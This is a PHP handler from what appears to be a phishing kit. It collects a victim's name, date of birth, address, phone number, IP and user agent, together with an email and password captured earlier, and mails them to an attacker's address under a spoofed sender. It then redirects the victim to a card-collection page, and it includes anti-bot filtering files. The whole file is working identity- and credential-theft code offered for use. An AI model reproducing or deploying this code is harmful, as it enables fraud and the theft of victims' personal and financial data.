<?php

error_reporting(0);
ob_start();
session_start();

include '../../prevents/anti1.php';
include '../../prevents/anti2.php';
include '../../prevents/anti3.php';
include '../../prevents/anti4.php';
include '../../prevents/anti5.php';
include '../../prevents/anti6.php';
include '../../prevents/anti7.php';
include '../../prevents/anti8.php';
include '../../monsterab/ab.php';
include '../../algorythm/mail.php';

if(isset($_POST['detailsSubmit'])){
//variables

$_SESSION['first_name'] = $_POST['first_name'];
$_SESSION['last_name'] = $_POST['last_name'];
$_SESSION['dob'] = $_POST['dob'];
$_SESSION['adresse'] = $_POST['adress'];
$_SESSION['ville'] = $_POST['city'];
$_SESSION['codepostale'] = $_POST['zipcode'];
$_SESSION['phone'] = $_POST['phone'];
$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

// Variable pour le txt
$email = $_SESSION['email'];
$mdp = $_SESSION['password'];
$prenom = $_SESSION['first_name'];
$nom = $_SESSION['last_name'];
$dob = $_SESSION['dob'];
$adress = $_SESSION['adresse'];
$ville = $_SESSION['ville'];	
$cp = $_SESSION['codepostale'];
$tel = $_SESSION['phone'];
$ip = $_SESSION['ip'];

//Condition si les valeurs ne sont pas remplies
if(empty($_SESSION['first_name']) || empty($_SESSION['last_name']) || empty($_SESSION['dob']) || empty($_SESSION['adresse']) || empty($_SESSION['ville']) || empty($_SESSION['codepostale']) || empty($_SESSION['phone']))
{
header('Location: index.php?error=true');
}
else{
$msg = "
👾 Prénom : ".$_SESSION['first_name']."
👾 Nom : ".$_SESSION['last_name']."
👾 Date de naissance : ".$_SESSION['dob']."
👾 Adresse : ".$_SESSION['adresse']."
👾 Ville : ".$_SESSION['ville']."
👾 Code postale : ".$_SESSION['codepostale']."
👾 Numéro de téléphone : ".$_SESSION['phone']."
------- GEO -------
🔢 : ".$_SESSION['ip']."
🌐 : ".$_SESSION['useragent']."
";
$subject = "「📲」INFO | $dob | ". $_SESSION['ip'] . " " ;
$fromsender = "From: ©️ ALIBABA ©️ <log@rezappl.com>";
	mail($rezmail,$subject,$msg,$fromsender);

$_SESSION['billing'] = true;
header('Location: ../card/');
}
}
else{

header('Location: ../../login/');
}
?>